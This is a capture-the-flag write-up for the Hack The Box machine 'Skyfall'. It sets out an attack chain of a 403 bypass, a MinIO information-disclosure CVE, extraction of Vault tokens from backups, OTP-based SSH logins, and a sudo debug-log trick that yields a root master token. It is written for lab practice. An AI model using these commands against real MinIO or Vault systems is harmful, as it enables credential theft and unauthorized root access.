# **Skyfall | HTB**

***
## **Difficulty = Insane**

***

Running our nmap scan we have 2 open ports -:


```bash
# Nmap 7.94SVN scan initiated Tue Feb  6 23:57:47 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 10.129.218.132
Increasing send delay for 10.129.218.132 from 0 to 5 due to 204 out of 509 dropped probes since last increase.
Increasing send delay for 10.129.218.132 from 5 to 10 due to 147 out of 367 dropped probes since last increase.
Warning: 10.129.218.132 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.218.132
Host is up (0.15s latency).
Not shown: 40843 closed tcp ports (conn-refused), 24690 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  7 00:02:23 2024 -- 1 IP address (1 host up) scanned in 276.15 seconds
```




Navigating to port 80/HTTP we have a skyfall web page



![](https://i.imgur.com/aCZhFfo.png)



Viewing page source we have a subdomain


![](https://i.imgur.com/XqLid3E.png)


We also have few usernames....



![](https://i.imgur.com/S8thBBr.png)



We can go ahead and add the discovered subdomain, [http://demo.skyfall.htb](http://demo.skyfall.htb/) to our `/etc/hosts` file



![](https://i.imgur.com/yotlKpy.png)




Navigating to the subdomain we have a login page as shown below



![](https://i.imgur.com/FcH5yQl.png)



Login in as `guest:guest` gives us this Page




![](https://i.imgur.com/eCx4fSd.png)



Navigating to `/files`, we have an upload function



![](https://i.imgur.com/ZqCRIZF.png)




Downloading the `welcome.pdf` file shows us this 



![](https://i.imgur.com/OQzXAMH.png)



Since we have been given a nudge to file upload, let see what we have, we can go ahead and upload `PHP` web shell



![](https://i.imgur.com/KyhJUhb.png)



Unfortunately, i found out the web application uses Flask(python) so we can't interact with PHP, Navigating to `/metrics`




![](https://i.imgur.com/m8acFaE.png)






We where able to bypass this 403 restriction with null byte `%0a`, and discover another subdomain http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster


![](https://i.imgur.com/Nh4GGaM.png)




Go ahead and add it to `/etc/hosts`



![](https://i.imgur.com/6Q1V6nA.png)


Navigating to the website and Making more enumeration i found out this minio version is vulnerable to information disclosure from [here](https://github.com/acheiii/CVE-2023-28432?tab=readme-ov-file)


![](https://i.imgur.com/7eNufL6.png)


Confirming our POC


![](https://i.imgur.com/R1ffWy5.png)


We can install the MinIO Client (MC) to enumerate more on this  https://github.com/minio/mc


```
./mc alias set miniobreachuser http://prd23-s3-backend.skyfall.htb MINIO_ROOT_USER MINIO_ROOT_PASSWORD
```


![](https://i.imgur.com/AGveG6S.png)



We can confirm if the minio server is truly up, This tells us we have 
2 active nodes


```
./mc admin info miniobreachuser
```



![](https://i.imgur.com/gDucjSi.png)


Enumerating further we found `gzip` archive with 3 other archives


```
./mc ls --versions miniobreachuser/askyy/home_backup.tar.gz
```



![](https://i.imgur.com/XDm4kFN.png)


Just to fast forward things i downloaded each of this archives to my system and extracted them but it looks like only the `2b75346d-2a47-4203-ab09-3c9f878466b8` archive had useful information in it `.bashrc` file which is a `VAULT_API_ADDR` and a `VAULT_TOKEN`


```bash
./mc cp --vid <ARCHIVE> miniobreachuser/askyy/home_backup.tar.gz .
```


![](https://i.imgur.com/x6RKpb6.png)


![](https://i.imgur.com/YZQ95sp.png)


Made more enumeration and saw that we can use a tool called vault to enumerate more and Generate a One-Time OTP code to login, Go ahead and download vault with the commands below 


```bash
# Install vault

$ wget https://releases.hashicorp.com/vault/1.12.2/vault_1.12.2_linux_amd64.zip
$ unzip vault_1.12.2_linux_amd64.zip 
```


Now export both of the `VAULT_API_ADDR` and `VAULT_TOKEN` into our own zsh environment variable with an extra variable of `VAULT_ADDR`


```bash
$ export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb/"
$ export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
$ export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb/"

$ ./vault status
```



![](https://i.imgur.com/NP7Zul6.png)


Confirming if you can successfully connect to the API


![](https://i.imgur.com/3EiIjp2.png)


Good!! Now we need to list the policy permissions for this API and see where we have Create, Read and Update Permissions ("`ssh/creds/dev_otp_key_role`")


```bash
./vault read sys/internal/ui/resultant-acl --format=json|jq -r .data
```



![](https://i.imgur.com/rXFBffE.png)



Then go ahead and create the `REMOTE_HOST_IP` environment variable whereby adding your target IP as the value


![](https://i.imgur.com/8gCuERF.png)



Now running Vault with the directory in which we have solid policy permissions, we get a `key` value and a `username`, make sure to note down the key as that is the password for the username via SSH 

```
./vault write <PATH> ip=$REMOTE_HOST_IP
```


![](https://i.imgur.com/SA2mgaF.png)




Go ahead and login via ssh


![](https://i.imgur.com/wetPsw3.png)

> Opps :(, Although we where able to login but since the user nobody isn't really a user and a one time OTP is been generated, meaning we can only use it once, hence we need to generate with the previous command. we need to find another way to get the OTP of another user



After my flow and through, i decided to hit up a friend (Elite Hacker shii :P), who then gave me this syntax



```bash
./vault ssh -role dev_otp_key_role -mode otp username@TARGET-IP

# you know how it works :)
```

After series of testing with different usernames, user `askyy` finally popped, also remember that the OTP is the SSH password


![](https://i.imgur.com/R3Rs0RS.png)



Now let get root 😫, Damn how do i say i am brainfucked without been brainfucked, Screams: HTB INSANE MACHINES!!!!!!


![](https://i.imgur.com/u2785Pa.png)


Aiit, Back to root, running `sudo -l` we have permissions to run `vault-unseal` with root privileges using `sudo`



![](https://i.imgur.com/ImVecRj.png)


Running this command, it creates a debug.log file in our present directory but we can't read it cos' it was probably created by root


```bash
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -v -d
```



![](https://i.imgur.com/inQ83Mi.png)


We can go ahead and delete this `debug.log` file and then create ours granting it `777` permissions and rerun the commands



![](https://i.imgur.com/qbItUuN.png)


Now you should be able to read the `debug.log` and have the master token, we will use this to gain root shell



![](https://i.imgur.com/rxhsiIa.png)


With this master token, i will be able to request an OTP for the user `root` SSH login as password, go ahead and export the token and check for permission policies


```bash
export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"

export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb/"

./vault read sys/internal/ui/resultant-acl --format=json|jq -r .data
```


![](https://i.imgur.com/oh72DP7.png)


Since we don't have any path, we can strip out the `-role` parameter from our command options, in which doing this gives us some roles we can use


```bash
./vault ssh -mode otp root@10.129.219.80
```



![](https://i.imgur.com/35ojIGz.png)




Go ahead and add the role parameter and you should be root




```bash
./vault ssh -role admin_otp_key_role -mode otp root@10.129.219.80
```



![](https://i.imgur.com/gWqL3po.png)


GG
